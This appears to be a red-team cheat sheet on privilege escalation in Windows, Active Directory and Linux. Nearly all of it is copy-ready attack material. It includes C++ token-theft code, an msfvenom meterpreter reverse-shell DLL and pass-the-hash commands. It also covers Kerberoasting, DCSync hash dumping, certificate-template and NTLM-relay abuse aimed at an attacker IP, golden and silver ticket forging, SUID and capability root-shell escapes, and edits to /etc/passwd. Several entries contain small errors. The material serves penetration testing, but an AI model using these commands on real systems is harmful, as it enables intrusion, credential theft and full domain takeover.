---
title: Privilege Escalation
date: 2026-01-22
background: bg-[#C2410C]
icon: king.svg
iconSize: 36
tags:
  - privilege escalation
  - red teaming
  - exploitation
  - penetration testing
categories:
  - Tactics, Techniques, and Procedures
intro:
  Techniques used to elevate privileges on compromised systems.
plugins:
  - copyCode
---

## Windows  (Local Focused)


### Stealing An Access Token {.col-span-2}
C++ Code for using a token that belongs to another process. 

Works by setting the `PID_TO_IMPERSONATE` variable to a process ID that you have access to.

**NOTE: MUST HAVE IMPERSONATE ACCESS TO THE PID. WILL NOT WORK IF USER DOES NOT HAVE INITAL PERMS TO THE PID**


```cpp

#include "stdafx.h"
#include <windows.h>
#include <iostream>

int main(int argc, char * argv[]) {
  char a;
  HANDLE processHandle;
  HANDLE tokenHandle = NULL;
  HANDLE duplicateTokenHandle = NULL;
  STARTUPINFO startupInfo;
  PROCESS_INFORMATION processInformation;
  DWORD PID_TO_IMPERSONATE = 3060;
  wchar_t cmdline[] = L"C:\\shell.cmd";
  ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
  ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);
  processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE);
  OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
  DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);			
  CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);

  std::cin >> a;
  return 0;
}
```
Credit to IRed-Team for Code Example

See: [ired-team](https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation)


### DLL Highjacking {.col-span-2}

To DLL highjack you must meet two condition. 
**1** The application must load the dll without denoting the fully qualified path.
**2** You must have access to place a file in the appropriate path

DLL's without a fully qualified path load in the following order:
- C:\Windows\System32
- C:\Windows\System
- C:\Windows
- The current working directory
- Directories in the system PATH environment variable
- Directories in the user PATH environment variable

If testing in a Lab, use a custom meterpreter DLL instead of going through the process of creating one
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP> LPORT=<Port> -f dll > <Name_of_the_original_DLL>.dll
```

Place the DLL in the lowest path possible. 
Execute the program.

If vulnerable the meterpreter DLL will run instead of the intended one. 
See: [ired-team](https://www.ired.team/offensive-security/privilege-escalation/t1038-dll-hijacking)
See:[Pentest Lab](https://pentestlab.blog/2017/03/27/dll-hijacking/)



### Unquoted Service Paths

Similar to DLL Highjacking if a service does not wrap its service binary in a fully qualified path using qoutes 
`"c:\progam files\Path\To\Service\Binary.exe "`
Then the system will iterate through the folder path until the binary is found. 

Using the example:
`"c:\progam files\Path\To\Service\Binary.exe "` 
The SC config service will iterate in the folllowing order
- C:\Program Files\Binary.exe
- C:\Program Files\Path\Binary.exe
- C:\Program Files\Path\To\Binary.exe
- C:\Program Files\Path\To\Service\Binary.exe


### Pass The Hash {.col-span-2}
**Invoke-WMIExec Method**
```powershell
Invoke-WmiExec -target ws01 -hash 32ed87bd5fdc5e9cba88547376818d4 -username administrator -command hostname
```

**Invoke-SMBExec Method**
```powershell
Invoke-SMBExec -target ws01 -hash 32ed87bd5fdc5e9cba88547376818d4 -username administrator -command whoami
```

**Impacket psexec.py Method**
```bash
psexec.py administrator@ws01 -hashes :32ed87bd5fdc5e9cba88547376818d4
```

**CrackMapExec Method**
```bash
crackmapexec smb ws01 -u administrator -H 32ed87bd5fdc5e9cba88547376818d4 -x hostname
```

**Evil-WinRM Method**
```powershell
evil-winrm -i ws01 -u administrator -H 32ed87bd5fdc5e9cba88547376818d4
```


### Enviornment Variable Abuse {.row-span-2}

**$Path Interception**
This is a "poison the well" type attack

Path Interception abuse is possible if the envionrment variable is
- **1** The folder is writable by the user
- **2** The folder precedes `c:\Windows\System32` For example if `c:\temp` is in the `env:Path`

In order for this attack to work you must name your malicious file the same name as a shorthand program.
For example `calc.exe`. This is because `calc.exe` can be called via the short hand command `calc`. 
When a high privlege user calls `calc` via run/cmd/powershell/ it will execute the `calc.exe` file within
`C:\temp` first before the one in System32

**STEP 1:** `Place a c2 .exe within the c:\temp\ folder` 
**STEP 2:** `wait for admin user to run calc in run or terminal` 

**Privileged PowerShell Module Path Hijacking**

This is a "poison the well" type attack.

PowerShell Module Path hijacking is possible if:

- **1** A directory in `$env:PSModulePath` is writable by the user

- **2** That directory appears before the legitimate system module paths

- **3** A privileged PowerShell process imports a module without a full path

In order for this attack to work, you must name your malicious module the same as a commonly imported module.

**Step 1:** Create a malicious module folder and .psm1 file in a writable directory that exists in `$env:PSModulePath`
As an example it could be  `PSReadLine`
```powershell
C:\temp\PSReadLine\PSReadLine.psm1
```
**Step 2:** Wait for an admin or SYSTEM PowerShell session to import the module by name.

See: [Ired-Team](https://www.ired.team/offensive-security/privilege-escalation/environment-variable-path-interception)


## Active Directory

### Kerberoasting
Abuse service accounts running with elevated privleges 
Keroasting is possible if:
- 1 A service account has an SPN
- 2 The password is weak or reused to be cracked in hashcat or other prefered tool

```bash
# using impacket
GetUserSPNs.py domain.local/user:pass -dc-ip <DC_IP> -request
```

Crack SPN Hash
```bash
hashcat -m 13100 -a 0 <kerberoast.hash> wordlist.txt
```

Using the cracked password
```bash
crackmapexec smb <TARGET> -u <svc_account> -p <cracked_password>
```

### AS-REP Roasting
Exploit accounts that do not require Kerberos preauthentication 
**LOW LIKELIHOOD**
AS-Rep roasting is possible if:
- 1 Preauth is disabled
- 2 Password is crackable

```bash {.wrap}
# using impacket
GetNPUsers.py domain.local/ -dc-ip <DC_IP> -usersfile users.txt -no-pass > asrep.hashes
```

Crack the hash
```bash
hashcat -m 18200 asrep.hashes wordlist.txt
```

### DCSync {.row-span-2}
Impersonate a Domain Controller to dump hashes.

DCSync is possible if:
- 1 The account has replication rights in the domain

**Using Mimikatz**
_dump a specific user_
```bash
lsadump::dcsync /domain:domain.local /user:krbtgt
```
_dump all domain users (noisy)_
```bash
lsadump::dcsync /domain:domain.local /all
```

**Using Impacket**
_Dump only a specific user via DRSUAPI._
```bash
secretsdump.py domain.local/user:pass@dc01 -just-dc-user krbtgt
```

_Dump all users via DCSync_
```bash
secretsdump.py domain.local/user:pass@dc01 -just-dc
```

**Using CrackMapExec**
_Target a specific account._
```bash
crackmapexec smb dc01 -u user -p pass --ntds --user krbtgt
```

**Using PowerView**
```powershell
Invoke-DCSync -Domain domain.local -User krbtgt
```

### GenericAll/GenericWrite Abuse (ACL Abuse)
Abuse excessive object permissions to take control of users or groups.
This is uncommon but at times service accounts or shared user accounts are given excessive permissions due to third party applications requiring them for AD functionality. 

ACL Abuse is possible if:
- 1 You control write permissions

```powershell {.wrap}
Set-ADAccountPassword targetuser -Reset -NewPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

### Shadow Credentials
Inject certificate-based authentication material into a privleged account

Shadow Credentials are possible if:
- 1 You can write `msDS-KeyCredentialLink`

**Step 1:** Inject credentials
```bash
certipy shadow auto -u user -p pass -target admin
```
**Step 2:** Auth using certificate
```bash
certipy auth -pfx admin.pfx
```



### ESC-1 Misconfigured Certificate Templates (Client Authentication Abuse) {.col-span-3}
Abuse a certificate template that allows low-privileged users to enroll and supports client authentication, resulting in a certificate that can be used to authenticate as yourself, but with privileges you should not have (often Domain Admin via group mappings, delegation, or service usage).

Key distinction from ESC-2:
ESC-1 you enroll as yourself, but the cert is usable for privileged auth
ESC-2 you enroll as someone else

ESC-1 is possible if:

- 1 A certificate template allows enrollment by low-priv users
- 2 The certificate template has `ENROLLEE_SUPPLIES_SUBJECT` set to `True`
- 2 The template allows Client Authentication or Smartcard Logon
- 3 The issued certificate can be used for Kerberos / LDAP auth
- 4 That authentication grants elevated access (directly or indirectly)

**Using Certipy**

_Enumerate vulnerable templates:_
```bash
certipy find -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -text -enabled -vulnerable
```

Look specifically for:

- `Client Authentication: True` 
- `Enrollment Rights: Domain Users` or `Domain Computers` or `Authenticated Users` 
- No manager approval required

_Request a certificate for yourself:_
```bash {.wrap}
certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -template 'VulnTemplate' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```

_Authenticate using the issued certificate:_
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.100
```


### ESC-2 Misconfigured Certificate Templates (ENROLLEE_SUPPLIES_SUBJECT) {.col-span-2}
Abuse a certificate template that allows the requester to supply arbitrary subject names, enabling certificate issuance for another user, including Domain Admins.

ESC-2 is possible if:
- 1 A certificate template has `ENROLLEE_SUPPLIES_SUBJECT`
- 2 The attacker can enroll in the template
- 3 The template allows authentication (Client Authentication / Smartcard Logon)

**Using Certipy**
_Enumerate vulnerable templates:_

```bash
certipy find -u user -p pass -dc-ip <DC_IP>
```
_Request a certifcate as another user:_
```bash
certipy req -u user -p pass -ca CA01 -template VulnerableTemplate -upn administrator@domain.local
```

_Authenticate as the target user:_
```bash
certipy auth -pfx administrator.pfx
```

**Using Certify**

_Find a vulnerable template:_
```powershell
Certify.exe find /vulnerable
```

_Request a certifcate for another user:_
```powershell
Certify.exe request /ca:CA01 /template:VulnerableTemplate /altname:administrator
```
_Authenticate using the certificate (example via Rubeus):_
```powershell
Rubeus.exe asktgt /certificate:administrator.pfx
```

### ESC-8 NTLM Relay to AD CS Web Enrollment {.col-span-2}
Abuse AD CS web enrollment (`/certsrv/`) by relaying NTLM authentication to request certificates on behalf of another user or computer.
ESC-8 is possible if:

- 1 AD CS Web Enrollment is enabled
- 2 NTLM authentication is allowed
- 3 SMB/HTTP authentication can be coerced

**Using Certipy**
_Start NTLM relay targeting AD CS:_
```bash
certipy relay -target http://ca01/ -template DomainController
```

_Coerce authentication (example using PetitPotam):_
```bash
python3 petitpotam.py -u exampleuser -p 'Password123!' attacker_ip dc01
```
_Authenticate using relayed certificate:_
```bash
certipy auth -pfx dc01.pfx
```

**Using Impacket**
_Relay NTLM to AD CS:_
```bash
ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

_Trigger authentication coercion:_
```bash
python3 petitpotam.py -u exampleuser -p 'Password123!' attacker_ip dc01
```
_Use the issued certificate:_
```bash
certipy auth -pfx dc01.pfx
```

### Golden Ticket
Forge arbitrary Kerberos TGTs using the KRBTGT account hash, granting domain-wide authentication without contacting the KDC for validation.

Golden Tickets are possible if:
- 1 The KRBTGT NTLM/AES key is compromised
- 2 You know the domain SID
- 3 You can inject Kerberos tickets into a session

**Using Mimikatz**

_Create and inject a Golden Ticket (RC4/NTLM):_
```shell {.wrap}
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:<KRBTGT_NTLM> /ptt
```

_Specify ticket lifetime (stealth-relevant):_
```shell {.wrap}
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:<KRBTGT_NTLM> /ticket:golden.kirbi /endin:600
```

_Inject an existing ticket:_
```shell
kerberos::ptt golden.kirbi
```

**Using Impact**
_Forge a Golden Ticket (NTLM):_
```bash {.wrap}
ticketer.py -nthash <KRBTGT_NTLM> -domain domain.local -domain-sid S-1-5-21-XXXX Administrator
```

_Or if NTLM isn't preferred. Use AES key instead_
```bash {.wrap}
ticketer.py -aesKey <KRBTGT_AES256> -domain domain.local -domain-sid S-1-5-21-XXXX Administrator
```

_Export and use the ticket:_
```bash
export KRB5CCNAME=Administrator.ccache
```

_Authenticate with the forged ticket:_
```bash {.wrap}
wmiexec.py domain.local/Administrator@dc01 -k -no-pass
```

### Silver Ticket
Forge service-specific Kerberos service tickets (TGS) using a service account hash, granting access to one service on one host without contacting the KDC.

Silver Tickets are possible if:

- 1 The target service account hash is compromised
- 2 You know the service SPN
- 3 The service does not strictly validate PACs

**Using Mimikatz**
_Forge a Silver Ticket for CIFS (SMB):_

```shell {.wrap}
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX /target:dc01.domain.local /service:cifs /rc4:<SERVICE_HASH> /ptt
```

_Or forge it for a HTTP Service:_

```shell {.wrap}
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX /target:web01.domain.local /service:http /rc4:<SERVICE_HASH> /ptt
```

_Access the service_
```powershell
dir \\dc01.domain.local\c$
```

**Using Impacket**
_Forge a Silver Ticket (CIFS):_

```shell {.wrap}
ticketer.py -nthash <SERVICE_HASH> -domain domain.local -domain-sid S-1-5-21-XXXX -spn cifs/dc01.domain.local Administrator
```

_Export the ticket:_
```bash
export KRB5CCNAME=Administrator.ccache
```

_Access the service:_
```bash
smbclient -k //dc01.domain.local/C$
```


## Linux  (Local Focused)

### Sudo Misconfiguration
Using various apps with sudo perms to escalate the shell

sudo perms to VIM
```bash
sudo vim -c ':!/bin/bash'
```

write to root-owned files
```bash
sudo tee /etc/sudoers
```

Abuse sudo with preserved environments
```bash
sudo -E /bin/bash
```

### SUID Binary Abuse {.row-span-2}

SUID `Bash`
```bash
bash -p
```
SUID  on `cp`

```bash
cp /bin/sh /tmp/rootsh
chmod +s /tmp/rootsh
```

SUID on `find`
```bash
find . -exec /bin/sh -p \; -quit
```

SUID on `less`/`more`
```bash
less /etc/hosts
!/bin/sh
```

SUID on `awk`
```bash
awk 'BEGIN {system("/bin/sh")}'
```

SUID on `tar`
```bash {.wrap}
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

SUID on `python`/`python3`
```bash
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
```

SUID on `perl`
```bash
perl -e 'exec "/bin/sh";'
```

SUID on `env`
```bash
env /bin/sh -p
```

SUID on `openssl`
```bash
openssl enc -in /bin/sh -out /tmp/rootsh
chmod +s /tmp/rootsh
```


### Capabilities Abuse  {.row-span-2}

A capability is a kernel-enforced permission that allows a process to perform a privileged operation without being root.

Historically, Linux had a binary model:

- UID 0 = god
- Everyone else = no power

Capabilities replace that with:
_“This process can do this specific privileged thing, but nothing else.”_
At the OS level, root is just a process that has all capabilities enabled.

**Capability Discovery (minimal, for context)**
```bash
getcap -r / 2>/dev/null
```

**CAP_SETUID / CAP_SETGID Abuses**
Change effective UID/GID without full root.

`Python`
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

`Perl`
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'
```

Escalate UID using Python with CAP_SETUID
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

#mount host filesystem with CAP_SYS_ADMIN
mount /dev/sda1 /mnt
```

**CAP_DAC_READ_SEARCH Abuses**
Bypass file read perms
```bash
/etc/shadow
```

```bash
tar cf - /root | tar xf -
```

**CAP_DAC_OVERRIDE**
Bypass file read/write permission checks

```bash
echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd
```

**CAP_SYS_CHROOT**
Change root directory; escape weak chroots.
```bash
chroot /mnt /bin/sh
```

### Hijack Methods


**Cron Job Hijacking**
_Scripts or referenced paths must be writeable by user_

Overwrite cron-executed script

```bash
echo '/bin/bash' > /path/to/cron/script.sh
```

Exploit PATH hijack in cron
```bash
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

**PATH Hijacking**
_Privleged scripts that call binary without full path_
```bash
echo '/bin/bash' > /tmp/python
chmod +x /tmp/python
```

**Service Hijacking**
_Service Runs as root, executables or configs must be writeable by user_

```bash
#replace service binary
cp /bin/bash /usr/local/bin/service-binary
chmod +s /usr/local/bin/service-binary
```

```bash
#trigger service restart
systemctl restart service-name
```
